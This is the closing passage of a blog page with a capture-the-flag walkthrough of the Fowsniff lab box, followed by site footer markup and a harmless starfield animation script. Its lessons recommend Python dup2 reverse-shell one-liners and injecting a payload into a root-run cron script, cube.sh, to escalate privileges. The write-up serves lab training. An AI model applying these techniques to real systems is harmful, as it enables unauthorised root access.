functionality (&gt;&gt; instead of &gt;) reduces chance of breaking automation and triggering alerts.</li><li>Use stable, built-in reverse shells	Python one-liners with dup2 are reliable across restricted environments — no bash, nc, or perl required.</li><li>Intelligence gold The breach warning confirmed prior compromise and hinted at lax security culture — encouraging deeper enumeration.</li><li>Timing matters in automated exploits	After injecting payload, exiting and waiting allowed cron/service to trigger cube.sh — no need to guess schedule.</li></ol><p>Key Takeaways for OSCP / Real-World Engagements</p><p>Manual enumeration + automation in small environments → A simple ls /opt found the vuln faster than LinPEAS.</p><p>Privilege escalation is often about logic flaws, not exploits → No buffer overflow, no kernel exploit — just bad permissions.</p><p>Document every assumption → We assumed cube.sh runs as root → validated post-exploitation with id.</p><pre><code>Proof.txt = King → Always screenshot:
+    ls -la /opt/cube/
+    tail cube.sh
+    id
+    cat /root/flag.txt
+</code></pre><p><em><strong>Writeups must be reproducible → Every command in this report can be copy-pasted and will work in the lab.</strong></em></p><h1 id="final-statement">Final Statement</h1><pre><code>&quot;In secure environments, the most dangerous vulnerabilities are the ones that look harmless.&quot;
+</code></pre><p>The cube.sh ASCII art banner was not a security control — it was a privilege escalation vector in disguise.</p><p><strong>This box serves as a perfect OSCP reminder:</strong> Trust no script. Check every permission. Escalate responsibly.</p><h4 id="root-flag-submitted">Root Flag Submitted.</h4><h4 id="system-fully-compromised">System: Fully Compromised.</h4><h4 id="report-oscp-ready">Report: OSCP-Ready.</h4></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 30, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/enumeration/">enumeration</a></li><li><a href="https://h4ck3rfirst.github.io/tags/exploit/">exploit</a></li><li><a href="https://h4ck3rfirst.github.io/tags/fowsniff/">Fowsniff</a></li><li><a href="https://h4ck3rfirst.github.io/tags/privilege-escalaiton/">Privilege-escalaiton</a></li><li><a href="https://h4ck3rfirst.github.io/tags/rce/">rce</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ssh/">Ssh</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Ffowsniff-from-foothold-to-root%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=Fowsniff%20%E2%80%93%20From%20Foothold%20to%20Root&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Ffowsniff-from-foothold-to-root%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=Fowsniff%20%E2%80%93%20From%20Foothold%20to%20Root https%3A%2F%2Fh4ck3rfirst.github.io%2Ffowsniff-from-foothold-to-root%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/bandit-level-0-33-full-walkthrough/" class="content__nav-link" rel="prev"><div><span>Previous</span> Bandit – Level 0 → 33 Full Walkthrough</div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/hackthebox-dog-walkthrough/" class="content__nav-link" rel="next"><div><span>Next</span> HackTheBox Dog Walkthrough</div></a></div></div></div></nav></footer></article></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
